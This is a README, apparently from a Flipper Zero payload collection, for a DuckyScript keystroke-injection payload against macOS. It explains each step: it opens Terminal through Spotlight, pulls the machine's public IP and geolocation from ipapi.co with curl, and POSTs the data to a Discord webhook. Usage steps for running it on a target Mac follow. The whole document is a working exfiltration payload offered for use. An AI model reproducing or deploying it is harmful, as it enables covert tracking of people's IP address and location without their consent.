# IPLogger-FlipZero by bst04

<div align=center>

<img src="https://github.com/aleff-github/my-flipper-shits/blob/main/img/logo-repository-2_0.gif" width="600" /><br><img src="https://github.com/aleff-github/my-flipper-shits/blob/main/img/DISCLAIMER.png" width="600" />

</div>

This script, created by bst04, is designed to work on macOS systems. It opens Terminal, fetches the public IP address of the device, and sends it to a Discord webhook using `curl`.

---

## Technical Explanation

1. **Initialization**:
    - `DELAY 500`: Waits for 0.5 seconds to ensure the system is ready.
    - `GUI SPACE`: Simulates pressing the "Command" + "Space" keys to open Spotlight Search.
    - `DELAY 500`: Waits for 0.5 seconds for Spotlight to open.
    - `STRING Terminal`: Types "Terminal" to search for the Terminal application.
    - `ENTER`: Opens the Terminal application.

2. **Fetch Public IP Address**:
    - `DELAY 1000`: Waits for 1 second to ensure Terminal is fully opened.
    - `STRING location=$(curl -s https://ipapi.co/json/)`: Fetches the public IP address and stores it in a variable named `location`.

3. **Send IP Address to Discord Webhook**:
    - `DELAY 1000`: Waits for 1 second to ensure the previous command is executed.
    - `STRING curl -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-urlencode "content=$location" https://yourwebhook`: Sends the link to the specified Discord webhook.

---

## Usage

1. Copy the payload script to your DuckyScript-enabled device.
2. Ensure the device is connected to a macOS system.
3. Execute the payload to fetch and send the public IP address to your Discord webhook.
